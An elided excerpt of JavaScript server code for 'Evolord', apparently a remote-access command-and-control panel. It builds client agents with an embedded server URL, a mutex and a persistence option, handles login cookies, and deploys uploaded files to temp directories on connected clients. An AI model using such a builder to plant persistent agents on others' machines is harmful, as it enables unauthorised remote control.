...
async function startBuildProcess(
  ...
  try {
    ...
    const clientDir = path.join(rootDir, "Evolord-Client");
    ...
    for (const platform of platformsToBuild) {
      ...
      if (config.serverUrl) {
        const serverFlag = `-X evolord-client/cmd/agent/config.DefaultServerURL=${config.serverUrl}`;
        ldflags = `${ldflags} ${serverFlag}`;
        sendToStream({ type: "output", text: `Server URL: ${config.serverUrl}\n`, level: "info" });
      }

      if (config.rawServerList) {
        const rawServerFlag = "-X evolord-client/cmd/agent/config.DefaultServerURLIsRaw=true";
        ldflags = ldflags ? `${ldflags} ${rawServerFlag}` : rawServerFlag;
        sendToStream({ type: "output", text: "Raw server list: enabled\n", level: "info" });
      }

      if (buildMutex) {
        const mutexFlag = `-X evolord-client/cmd/agent/config.DefaultMutex=${buildMutex}`;
        ldflags = ldflags ? `${ldflags} ${mutexFlag}` : mutexFlag;
      }
      
      if (config.enablePersistence) {
        const persistenceFlag = "-X evolord-client/cmd/agent/config.DefaultPersistence=true";
...
async function startServer() {
  ...
  if (!certificatesExist(TLS_CERT_PATH, TLS_KEY_PATH)) {
    ...
    const hostname = process.env.EVOLORD_HOSTNAME || "localhost";
    ...
    async fetch(req, server) {
        ...
        try {
          ...
          if (user) {
            ...
            return new Response(JSON.stringify({ 
              ...
              headers: {
                "Content-Type": "application/json",
                "Set-Cookie": `evolord_token=${token}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=604800` 
              },
            });
          }
      ...
      if (req.method === "POST" && url.pathname === "/api/logout") {
        ...
        return new Response(JSON.stringify({ ok: true }), {
          headers: {
            "Content-Type": "application/json",
            "Set-Cookie": `evolord_token=; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=0` 
          },
        });
      }
            ...
            if (result.success) {
              ...
              if (user.userId === userId && targetUser) {
                ...
                return new Response(JSON.stringify({ 
                  ...
                  headers: {
                    "Content-Type": "application/json",
                    "Set-Cookie": `evolord_token=${newToken}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=604800` 
                  },
                });
              }
      ...
      if (req.method === "POST" && url.pathname === "/api/deploy/run") {
        ...
        for (const clientId of clientIds) {
          ...
          const dir = clientOs === "windows"
            ? `C:\\Windows\\Temp\\Evolord\\${upload.id}`
            : `/tmp/evolord/${upload.id}`;
...
<html lang="en">
  <head>
    ...
    <title>${pluginId} - Evolord Plugin</title>
  ...
  const localIPs = getLocalIPs();
  logger.info(`========================================`);
  logger.info(`Evolord Server - SECURE MODE (TLS Always On)`);
  logger.info(`========================================`);
  ...
  logger.info(`   Or use: EVOLORD_TLS_INSECURE_SKIP_VERIFY=true (dev only)`);
  logger.info(`========================================`);
}
